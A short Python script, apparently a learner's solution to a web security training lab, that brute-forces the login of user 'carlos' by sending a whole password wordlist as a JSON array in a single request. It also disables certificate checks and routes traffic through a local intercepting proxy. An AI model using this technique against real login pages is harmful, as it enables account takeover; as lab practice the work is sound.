import requests 
import urllib3 

# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a4c0000032991b980f6fd9000810082.web-security-academy.net/"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# here create blank list and then later append in this password from the for loop
password_list =[]
with open("password.txt",'r') as file:
    for i in file:
        password=i.strip()
        print(password)
        password_list.append(password)
        print(password_list)


data = {"username":"carlos","password":password_list}

# This sends the request body as JSON, not as form data
response = requests.post(url+"login",verify=False,json=data,proxies=proxies)
if response.status_code == 302:
    print("login successful")



# dout need to check with rounak in list can we determine the correct password ?
# because here the lab is directly solved because we are firing the password into  json format so its automatic solve the lab 
    